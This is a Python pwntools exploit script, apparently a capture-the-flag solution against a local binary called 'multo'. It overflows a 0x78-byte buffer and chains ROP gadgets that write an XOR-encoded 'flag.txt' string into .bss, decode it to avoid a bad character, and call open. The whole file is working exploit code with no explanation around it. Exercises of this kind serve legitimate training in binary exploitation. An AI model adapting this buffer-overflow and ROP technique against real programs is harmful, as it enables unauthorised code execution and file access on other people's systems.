#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('multo', checksec=False)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        host = args.HOST or 'localhost'
        port = int(args.PORT or 1337)
        return remote(host, port)
    elif args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
    continue
'''.format(**locals())

io = start()
rop = ROP(exe)

badchar = b"."
target = b"flag.txt"
xored = bytes([a ^ 0x2 for a in target])

payload = flat(
    b'A' * 0x78,
    rop.find_gadget(['pop r12', 'ret'])[0],
    u64(xored.ljust(8, b'\x00')),
    rop.find_gadget(['pop r13', 'ret'])[0],
    exe.bss() + 0x400,
    rop.find_gadget(['pop r15', 'ret'])[0],
    exe.bss() + 0x400,
    rop.find_gadget(['pop r14', 'ret'])[0],
    0x2,
    0x00000000004013cc, # mov %r12, (%r13); ret
    p64(0x00000000004013c5)*(len(target)), # xor byte ptr [r15], r14b; inc r15; ret
    rop.find_gadget(['pop rdi', 'ret'])[0],
    exe.bss() + 0x400,
    rop.find_gadget(['ret'])[0],
    exe.sym['open']
)

io.sendline(payload)

assert all(c not in payload for c in badchar)

io.interactive()